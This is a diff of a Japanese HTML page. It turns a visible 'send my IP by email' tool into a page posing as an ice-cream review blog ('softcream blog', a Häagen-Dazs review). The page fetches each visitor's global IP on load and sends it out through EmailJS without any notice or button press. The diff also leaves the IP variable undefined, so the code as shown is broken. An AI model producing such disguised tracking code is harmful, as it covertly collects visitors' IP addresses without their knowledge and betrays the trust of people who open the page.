@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>グローバルIPをEmailJSで送信</title>
+    <title>softcream blog</title>
     <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
@@ -12,32 +12,21 @@
     </script>
 </head>
 <body>
-    <h1>グローバルIPをメールで送信</h1>
-    <p>あなたのIP: <span id="ip-address">取得中...</span></p>
-    <button onclick="sendIpViaEmail()">IPをメールで送信</button>
-    <p id="status"></p>
+    <h1>ハーゲンダッツ 徹底レビュー</h1>
 
     <script>
         // グローバルIPを取得
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                document.getElementById('ip-address').textContent = data.ip;
+                sendIpViaEmail();
             })
             .catch(error => {
-                document.getElementById('ip-address').textContent = '取得失敗';
-                document.getElementById('status').textContent = 'IP取得に失敗しました';
                 console.error('IP取得エラー:', error);
             });
 
         // EmailJSでIPを送信
         function sendIpViaEmail() {
-            const ip = document.getElementById('ip-address').textContent;
-            if (ip === '取得中...' || ip === '取得失敗') {
-                document.getElementById('status').textContent = 'IPが取得できていません';
-                return;
-            }
-
             const templateParams = {
                 ip: ip,
                 timestamp: new Date().toISOString()
